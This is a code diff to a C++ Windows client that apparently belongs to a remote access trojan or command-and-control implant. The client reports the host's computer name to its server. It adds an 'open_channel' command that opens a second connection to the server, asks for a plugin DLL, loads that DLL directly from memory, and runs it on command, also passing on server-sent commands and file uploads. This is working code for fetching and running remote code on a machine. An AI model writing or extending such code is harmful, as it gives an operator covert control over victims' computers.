@@ -91,6 +91,9 @@ private:
     SOCKET sock;
     PluginManager pluginMgr;
     bool connected = false;
+    string serverHost;
+    int serverPort = 0;
+    string myClientId;
     string pendingPluginId;
     string pendingPluginCommand;
     bool hasPendingPluginCommand = false;
@@ -343,6 +346,13 @@ private:
             else if (action == "reconnect") {
                 connected = false;
             }
+            else if (action == "open_channel") {
+                string plugin_id  = data.value("plugin_id", "");
+                string channel_id = data.value("channel_id", "");
+                if (!plugin_id.empty() && !channel_id.empty()) {
+                    open_plugin_channel(plugin_id, channel_id);
+                }
+            }
             else if (action == "ping") {
                 send_data({{"action", "pong"}});
             }
@@ -473,6 +483,8 @@ private:
         DWORD pSize = sizeof(pcname);
         GetComputerNameA(pcname, &pSize);
 
+        myClientId = string(pcname);
+
         json info = {
             {"action",    "initial_info"},
             {"ip",        "127.0.0.1"},
@@ -486,8 +498,121 @@ private:
         send_data(info);
     }
 
+    void open_plugin_channel(const string& plugin_id, const string& channel_id) {
+        string hostCopy = serverHost;
+        int portCopy = serverPort;
+        string clientCopy = myClientId;
+
+        thread([this, hostCopy, portCopy, clientCopy, plugin_id, channel_id]() {
+            run_channel_session(hostCopy, portCopy, clientCopy, plugin_id, channel_id);
+        }).detach();
+    }
+
+    void run_channel_session(const string& host, int port, const string& clientId,
+                             const string& plugin_id, const string& channel_id) {
+        WSADATA wsa;
+        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
+
+        struct addrinfo hints = {0}, *res = NULL;
+        hints.ai_family = AF_INET;
+        hints.ai_socktype = SOCK_STREAM;
+
+        string port_str = to_string(port);
+        if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &res) != 0) {
+            WSACleanup();
+            return;
+        }
+
+        SOCKET channelSock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+        if (channelSock == INVALID_SOCKET) {
+            freeaddrinfo(res);
+            WSACleanup();
+            return;
+        }
+
+        if (connect(channelSock, res->ai_addr, (int)res->ai_addrlen) != 0) {
+            closesocket(channelSock);
+            freeaddrinfo(res);
+            WSACleanup();
+            return;
+        }
+
+        freeaddrinfo(res);
+
+        // Send channel_init JSON over the channel socket
+        json initObj = {
+            {"action",     "channel_init"},
+            {"client_id",  clientId},
+            {"plugin_id",  plugin_id},
+            {"channel_id", channel_id}
+        };
+        string initMsg = initObj.dump() + "\r\n";
+        send(channelSock, initMsg.c_str(), (int)initMsg.length(), 0);
+
+        // If plugin not loaded, request DLL over channel socket
+        if (!pluginMgr.isPluginLoaded(plugin_id)) {
+            json reqObj = {{"action", "request_plugin"}, {"id", plugin_id}};
+            string reqMsg = reqObj.dump() + "\r\n";
+            send(channelSock, reqMsg.c_str(), (int)reqMsg.length(), 0);
+        } else {
+            pluginMgr.executePlugin(plugin_id, "RunPlugin", channelSock);
+        }
+
+        // Loop handling server messages on channel socket
+        vector<uint8_t> recv_buffer;
+        uint8_t chunk[8192];
+        while (true) {
+            int bytesRead = recv(channelSock, (char*)chunk, sizeof(chunk), 0);
+            if (bytesRead <= 0) break;
+
+            recv_buffer.insert(recv_buffer.end(), chunk, chunk + bytesRead);
+
+            while (!recv_buffer.empty()) {
+                if (recv_buffer.size() >= sizeof(PacketHeader)) {
+                    PacketHeader* header = (PacketHeader*)recv_buffer.data();
+                    if (header->signature == 0x524E) {
+                        if (recv_buffer.size() < sizeof(PacketHeader) + header->size) break;
+
+                        uint8_t* payload = recv_buffer.data() + sizeof(PacketHeader);
+                        if (header->type == PACKET_TYPE_JSON) {
+                            string cmdStr((char*)payload, header->size);
+                            pluginMgr.executePluginCommand(plugin_id, "HandleCommand", channelSock, cmdStr);
+                        } else if (header->type == PACKET_TYPE_FILE_UPLOAD) {
+                            vector<uint8_t> payload_vec(payload, payload + header->size);
+                            pluginMgr.executePluginBinary(plugin_id, "HandleBinary", channelSock, payload_vec);
+                        } else if (header->type == PACKET_TYPE_DLL) {
+                            vector<uint8_t> dll_data(payload, payload + header->size);
+                            if (pluginMgr.loadPluginFromMemory(plugin_id, dll_data)) {
+                                pluginMgr.executePlugin(plugin_id, "RunPlugin", channelSock);
+                            }
+                        }
+                        recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + sizeof(PacketHeader) + header->size);
+                        continue;
+                    }
+                }
+
+                string current_buf((char*)recv_buffer.data(), recv_buffer.size());
+                size_t pos = current_buf.find("\r\n");
+                if (pos != string::npos) {
+                    string cmdStr = current_buf.substr(0, pos);
+                    pluginMgr.executePluginCommand(plugin_id, "HandleCommand", channelSock, cmdStr);
+                    recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + pos + 2);
+                    continue;
+                }
+
+                if (recv_buffer.size() > 128 * 1024 * 1024) recv_buffer.clear();
+                break;
+            }
+        }
+
+        closesocket(channelSock);
+        WSACleanup();
+    }
+
 public:
     void start(const char* host, int port) {
+        serverHost = host;
+        serverPort = port;
         while (true) {
             WSADATA wsa;
             if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
